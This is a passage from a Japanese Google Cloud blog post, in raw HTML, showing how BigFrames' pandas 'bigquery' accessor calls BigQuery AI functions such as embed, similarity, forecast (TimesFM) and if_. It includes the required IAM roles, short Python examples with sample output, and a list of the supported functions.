ライブラリを利用し、計算処理を Google Cloud へ透過的に push します。</span><code style=\"vertical-align: baseline;\">.ai.predict()</code><span style=\"vertical-align: baseline;\"> などの AI メソッドを呼び出しても、回帰処理はローカルでは計算されません。代わりに、pandas オペレーションを Google 標準 SQL に変換し、対応する基盤モデル（</span><a href=\"https://cloud.google.com/blog/ja/products/data-analytics/tabfm-adds-predictive-ml-to-bigquery?e=48754805&amp;hl=ja\"><span style=\"text-decoration: underline; vertical-align: baseline;\">TabFM</span></a><span style=\"vertical-align: baseline;\"> など）を BigQuery のインフラストラクチャ上でネイティブに実行して、その結果を標準の pandas DataFrame としてシームレスに返します。これにより、BigQuery 独自の強力な機能やサービスを活用して、ローカルのデータセットを簡単に処理できるようになります。</span></p>\n<p><span style=\"vertical-align: baseline;\">以降のセクションでは、実行可能なその他のコード例について詳しく解説します。また、これらのコードはすべて、こちらの</span><a href=\"http://github.com/google/bigframes/blob/main/notebooks/generative_ai/pandas_bq_accessor_ai_functions.ipynb\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">ノートブック</span></a><strong style=\"font-style: italic; vertical-align: baseline;\">でも確認できます。</strong></p>\n<h3><strong style=\"vertical-align: baseline;\">環境のセットアップ</strong></h3>\n<p><span style=\"vertical-align: baseline;\">この投稿内のコードサンプルを実行する前に、以下のロールが付与された Google Cloud プロジェクトが用意されていることを確認してください（詳しくは、</span><a href=\"https://docs.cloud.google.com/bigquery/docs/permissions-for-ai-functions\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI 関数の権限</span></a><span style=\"vertical-align: baseline;\">についてのドキュメントをご覧ください）。</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">クエリジョブを実行する:</span><a href=\"https://docs.cloud.google.com/iam/docs/roles-permissions/bigquery#bigquery.jobUser\"><span style=\"vertical-align: baseline;\"> </span><span style=\"text-decoration: underline; vertical-align: baseline;\">BigQuery ジョブユーザー</span></a><span style=\"vertical-align: baseline;\">（roles/bigquery.jobUser）</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Gemini Enterprise Agent Platform で基盤モデルにアクセスする:</span><a href=\"https://docs.cloud.google.com/iam/docs/roles-permissions/aiplatform#aiplatform.user\"><span style=\"vertical-align: baseline;\"> </span><span style=\"text-decoration: underline; vertical-align: baseline;\">Agent Platform ユーザー</span></a><span style=\"vertical-align: baseline;\">（roles/aiplatform.user）</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">次に、Jupyter 環境に pandas と BigFrames をインストールします。AI アクセサーを有効にするには、BigFrames ライブラリをインポートし、Google Cloud のプロジェクト ID を指定するだけです。これにより、これ以降の AI 関数の呼び出しはすべて、承認済みのプロジェクト経由で実行されるようになります。</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;import bigframes.pandas as bpd \\r\\n\\r\\n# Replace with your project ID \\r\\nbpd.options.bigquery.project = &quot;my-project&quot;&#x27;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7fe577227050&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">構成が完了すると、標準の pandas オブジェクトから BigQuery AI 関数を直接呼び出せるようになります。</span></p>\n<h3><strong style=\"vertical-align: baseline;\">pandas シリーズの関数</strong></h3>\n<p><span style=\"vertical-align: baseline;\">pandas の `Series` にアタッチされた AI 関数は、単一列の入力シーケンスを受け取ります。</span></p>\n<p><strong style=\"vertical-align: baseline;\">例: AI.EMBED</strong></p>\n<p><span style=\"vertical-align: baseline;\">ベクトル エンベディングの生成は、現代の NLP やセマンティック検索パイプラインにおける基本ステップです。`ai.embed()` 関数を使用すると、シンプルな 1 つの式でテキスト列全体のエンベディングを計算できます。</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &quot;import pandas as pd\\r\\n\\r\\nanimals = pd.Series([&#x27;dog&#x27;, &#x27;fish&#x27;])\\r\\nanimals.bigquery.ai.embed(endpoint=&#x27;text-embedding-005&#x27;)\\r\\n# 0    {&#x27;result&#x27;: array([ 1.78243860e-03, -1.10658340...\\r\\n# 1    {&#x27;result&#x27;: array([-7.29714287e-03,  1.04725976...\\r\\n# dtype: struct&lt;result: list&lt;item: double&gt;, status: string&gt;[pyarrow]&quot;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7fe577227b50&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">その裏側では、BigFrames が pandas Series を BigQuery で処理可能な形式に変換し、出力結果をネイティブな pandas Series にキャストします。開発者の視点からは、すべてのワークフローが pandas 内で完結します。</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &quot;result = animals.bigquery.ai.embed(endpoint=&#x27;text-embedding-005&#x27;)\\r\\ntype(result)\\r\\n# pandas.Series&quot;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7fe5772247d0&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">このオペレーションの出力は、生成されたエンベディング リストを含むネイティブな pandas `Series` です。BigFrames が一時的な BigQuery への変換、モデルの実行、最終的なデータ整形をすべて自動で処理するため、使い慣れた pandas インターフェースを離れる必要は一切ありません。</span></p>\n<p><strong style=\"vertical-align: baseline;\">例: AI.SIMILARITY</strong></p>\n<p><span style=\"vertical-align: baseline;\">意味的な類似性を計算する必要がある場合は、`ai.similarity()` 関数を使用します。この関数は、Series の要素とターゲットとの間のコサイン類似度スコアを算出します。このターゲットには、スカラーのリテラル文字列または別の Series のいずれかを指定できます。pandas の `Series` とスカラー文字列を比較して、一致するコンセプトを検索する方法は次のとおりです。</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &quot;import pandas as pd\\r\\n\\r\\nanimals = pd.Series([&#x27;dog&#x27;, &#x27;fish&#x27;])\\r\\nanimals.bigquery.ai.similarity(&#x27;shrimp&#x27;, endpoint=&#x27;text-embedding-005&#x27;)\\r\\n# 0    0.629751\\r\\n# 1    0.768028\\r\\n# dtype: Float64&quot;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7fe577226490&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">同様に、2 つの異なる pandas `Series` オブジェクト間でペアワイズ比較を実行すれば、別々のデータセット間における意味的な相関関係を見つけ出すことができます。</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &quot;import pandas as pd\\r\\n\\r\\nanimals = pd.Series([&#x27;dog&#x27;, &#x27;fish&#x27;])\\r\\nrandom_stuff = pd.Series([&#x27;smart phone&#x27;, &#x27;salmon&#x27;])\\r\\n\\r\\nanimals.bigquery.ai.similarity(random_stuff, endpoint=&#x27;text-embedding-005&#x27;)\\r\\n# 0    0.651206\\r\\n# 1    0.835251\\r\\n# dtype: Float64&quot;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7fe577224310&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">どちらの場合も、戻り値は浮動小数点の類似度スコアを持つ標準的な pandas `Series` となるため、フィルタリングやソートといった後続の pandas メソッドでそのまま活用できます。</span></p>\n<h3><strong style=\"vertical-align: baseline;\">pandas DataFrame の関数</strong></h3>\n<p><span style=\"vertical-align: baseline;\">DataFrame AI 関数は、複数列からなる構造化テーブルを操作したり、複数のデータ入力を伴う複雑なプロンプトを処理したりします。</span></p>\n<p><strong style=\"vertical-align: baseline;\">例: AI.FORECAST</strong></p>\n<p><span style=\"vertical-align: baseline;\">時系列予測を行うには、通常、タイムスタンプのフォーマット調整、エンティティのグループ化、モデルのトレーニングなどのために大量のボイラープレート コードが必要になります。`ai.forecast()` 関数を使用すると、シンプルな高レベル パラメータを指定するだけで、グループ化された構造化データに対する時系列予測を行うことができます。これを実際に試すために、まず過去の売上データを表す入力サンプルの DataFrame を準備します。</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;import pandas as pd\\r\\n\\r\\ndates = pd.date_range(&quot;2025-01-01&quot;, periods=14, freq=&quot;D&quot;)\\r\\n\\r\\ndf = pd.DataFrame({\\r\\n    &quot;date&quot;: dates.tolist() * 2,\\r\\n    &quot;item_id&quot;: [&quot;item_1&quot;] * 14 + [&quot;item_2&quot;] * 14,\\r\\n    &quot;sales&quot;: [\\r\\n        100, 105, 110, 115, 120, 125, 130, 135, 140, 145, 150, 155, 160, 165,\\r\\n        50, 52, 55, 58, 60, 62, 65, 68, 70, 72, 75, 78, 80, 85,\\r\\n    ],\\r\\n})\\r\\n\\r\\ndf.sample(5)\\r\\n#          date item_id  sales\\r\\n# 15 2025-01-02  item_2     52\\r\\n# 10 2025-01-11  item_1    150\\r\\n# 24 2025-01-11  item_2     75\\r\\n# 26 2025-01-13  item_2     80\\r\\n# 7  2025-01-08  item_1    135&#x27;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7fe577227e90&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">データの準備ができたら、DataFrame から直接 `ai.forecast()` を呼び出すことができます。ここでは、ターゲット指標、タイムスタンプ列、グループ化キー、3 日間の予測期間を指定します。</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;df.bigquery.ai.forecast(\\r\\n    data_col=&quot;sales&quot;, \\r\\n    timestamp_col=&quot;date&quot;, \\r\\n    id_cols=[&quot;item_id&quot;], \\r\\n    horizon=3\\r\\n)\\r\\n#   item_id         forecast_timestamp  forecast_value  confidence_level  \\\\\\r\\n# 0  item_1  2025-01-16 00:00:00+00:00      174.257492              0.95   \\r\\n# 1  item_1  2025-01-15 00:00:00+00:00      167.466003              0.95   \\r\\n# 2  item_1  2025-01-17 00:00:00+00:00      180.491333              0.95   \\r\\n# 3  item_2  2025-01-17 00:00:00+00:00        91.99752              0.95   \\r\\n# 4  item_2  2025-01-15 00:00:00+00:00       87.950104              0.95   \\r\\n# 5  item_2  2025-01-16 00:00:00+00:00       90.050346              0.95   \\r\\n# \\r\\n#    prediction_interval_lower_bound  prediction_interval_upper_bound  \\\\\\r\\n# 0                       175.728216                        177.85742   \\r\\n# 1                        169.34789                       169.553343   \\r\\n# 2                       178.587954                       185.040092   \\r\\n# 3                        79.145413                       100.786089   \\r\\n# 4                        82.876698                        92.470649   \\r\\n# 5                        81.460533                        96.463373   \\r\\n# \\r\\n#   ai_forecast_status  \\r\\n# 0                     \\r\\n# 1                     \\r\\n# 2                     \\r\\n# 3                     \\r\\n# 4                     \\r\\n# 5&#x27;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7fe5772261d0&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">返される DataFrame には、信頼水準や予測区間などの統計パラメータとともに、予測値の全データが含まれます。内部処理では、</span><a href=\"https://docs.cloud.google.com/bigquery/docs/timesfm-model\"><span style=\"text-decoration: underline; vertical-align: baseline;\">TimesFM</span></a><span style=\"vertical-align: baseline;\"> モデルがトリガーされてトレンド分析が行われ、きれいに構造化された結果が pandas DataFrame としてローカル環境に返されます。model 引数を使用してモデル バージョンを選択することもできます。たとえば、model=\"TimesFM 3.0\" を渡すと、最新の TimesFM モデルを使用できます。このモデルは現在 BigQuery でプレビュー版として提供されており、GIFT-Eval、FEV-Bench、TIME などの予測ベンチマークで 1 位を獲得しています。</span></p>\n<p><strong style=\"vertical-align: baseline;\">例: AI.IF</strong></p>\n<p><span style=\"vertical-align: baseline;\">自然言語の条件で行をフィルタする処理は、最もよく使われる生成 AI タスクの一つです。`ai.if_()` 関数は、リテラル文字列と DataFrame の列を組み合わせて作成されたプロンプトを評価し、各行に対して True または False を返します。</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;import pandas as pd\\r\\n\\r\\ndf = pd.DataFrame({\\r\\n    &quot;animal&quot;: [&quot;cougar&quot;, &quot;fish&quot;],\\r\\n    &quot;habitat&quot;: [&quot;mountain&quot;, &quot;grassland&quot;]\\r\\n})\\r\\n\\r\\nprompt = (df[&quot;animal&quot;], &quot; lives in the &quot;, df[&quot;habitat&quot;])\\r\\n\\r\\ndf.bigquery.ai.if_(prompt)\\r\\n# 0     True\\r\\n# 1    False\\r\\n# dtype: boolean&#x27;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7fe5772279d0&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">`ai.if_()` はブール値の Series を返すため、pandas のフィルタマスクとして直接使用できます（例: `df[df.bigquery.ai.if_(prompt)]`）。`ai.if_()` はデフォルトで最適化モード（optimization_mode=\"minimize_cost\"）で実行されます。ローカルの蒸留モデルがほとんどの行を処理し、残りの行のみを Gemini に送信することで、大規模データセットのコストとレイテンシを削減します。代わりにすべての行を LLM に送信するには、`optimization_mode` を `\"maximize_quality\"` に設定します。</span></p>\n<h3><strong style=\"vertical-align: baseline;\">使ってみる</strong></h3>\n<p><code style=\"vertical-align: baseline;\">bigquery</code><span style=\"vertical-align: baseline;\"> アクセサーが提供する AI 関数を使用すると、ネイティブなデータ構造内で高度な ML ツールを直接活用できるため、使い慣れた Python エコシステムを離れることなく、複雑な AI の課題を解決できます。</span></p>\n<p><span style=\"vertical-align: baseline;\">現在サポートされている AI 関数は次のとおりです（詳細については、</span><a href=\"https://dataframes.bigquery.dev/reference/api/bigframes.bigquery.ai.html\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">ドキュメント</span></a><span style=\"vertical-align: baseline;\">をご覧ください）。</span></p>\n<p><strong style=\"vertical-align: baseline;\">pandas Series</strong></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">embed():</strong><span style=\"vertical-align: baseline;\"> 単一の列に対してベクトル エンベディングを生成します。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">generate_embedding():</strong><span style=\"vertical-align: baseline;\"> テーブルに対してベクトル エンベディングを生成します。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">generate_table():</strong><span style=\"vertical-align: baseline;\"> 自然言語タスクを実行し、構造化された出力を生成します。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">generate_text():</strong><span style=\"vertical-align: baseline;\"> 自然言語タスクを実行し、自由形式のテキストを生成します。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">similarity():</strong><span style=\"vertical-align: baseline;\"> エントリ間のセマンティックな近さ（コサイン類似度）を計算します。</span></p>\n</li>\n</ul>\n<p><strong style=\"vertical-align: baseline;\">pandas DataFrame</strong></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">classify():</strong><span style=\"vertical-align: baseline;\"> ゼロショット分類を実行します。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">forecast():</strong><span style=\"vertical-align: baseline;\"> 最新の TimesFM 3.0 を含む TimesFM を使用して、グループ化されたデータ全体の時系列予測を実行します。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">generate():</strong><span style=\"vertical-align: baseline;\"> 複数の列をまたぐ動的なプロンプトを評価し、テキスト レスポンスを生成します。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">generate_bool():</strong><span style=\"vertical-align: baseline;\"> 自然言語の条件を評価し、ブール値（True / False）を返します。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">generate_double():</strong><span style=\"vertical-align: baseline;\"> プロンプトを評価し、浮動小数点数を返します。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">generate_int():</strong><span style=\"vertical-align: baseline;\"> プロンプトを評価し、整数を返します。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">if_():</strong><span style=\"vertical-align: baseline;\"> 自然言語の条件に基づいて行をフィルタします。デフォルトでは最適化モードを使用して、コストとレイテンシを削減します。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">predict():</strong><span style=\"vertical-align: baseline;\"> TabFM を使用して、回帰などの予測モデリングを実行します。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">score():</strong><span style=\"vertical-align: baseline;\"> 定義したスコアリング システムに基づいて入力を評価します。</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">エンベディングの生成でも、完全な時系列予測の実行でも、</span><a href=\"https://dataframes.bigquery.dev/reference/api/bigframes.bigquery.ai.html\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">pandas 内の BigQuery AI 関数</span></a><span style=\"vertical-align: baseline;\">を使用すれば、ML のスケーリングを簡単に行えます。ぜひお試しいただき、データに面倒な作業を任せましょう。</span></p>\n<p><strong style=\"font-style: italic; vertical-align: baseline;\">- </strong><span style=\"font-style: italic; vertical-align: baseline;\">シニア ソフトウェア エンジニア、</span><strong style=\"font-style: italic; vertical-align: baseline;\">Shenyang Cai</strong></p></div>"
